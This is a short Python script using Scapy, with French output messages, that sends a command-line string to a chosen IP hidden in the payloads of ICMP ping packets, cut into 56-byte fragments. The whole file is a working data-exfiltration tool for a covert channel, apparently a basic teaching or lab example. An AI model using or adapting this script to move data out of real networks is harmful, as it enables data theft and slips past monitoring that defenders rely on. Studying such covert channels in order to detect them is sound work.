from scapy.all import ICMP, IP, send
import sys

def icmp_exfiltration(target_ip, data):
   
    print(f"[*] Envoi de la chaîne '{data}' dans des pings vers {target_ip}")
    
    max_data_size = 56
    fragments = [data[i:i+max_data_size] for i in range(0, len(data), max_data_size)]
    
    for fragment in fragments:
        packet = IP(dst=target_ip) / ICMP() / fragment
        send(packet, verbose=False)
        print(f"[*] Paquet envoyé : {fragment}")

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: python icmp_basic_exfiltr.py <target_ip> <data>")
        print("Exemple: python icmp_basic_exfiltr.py 1.1.1.1 'Hello, ICMP exfiltration!'")
        sys.exit(1)

    target_ip = sys.argv[1]
    data = sys.argv[2]

    icmp_exfiltration(target_ip, data)
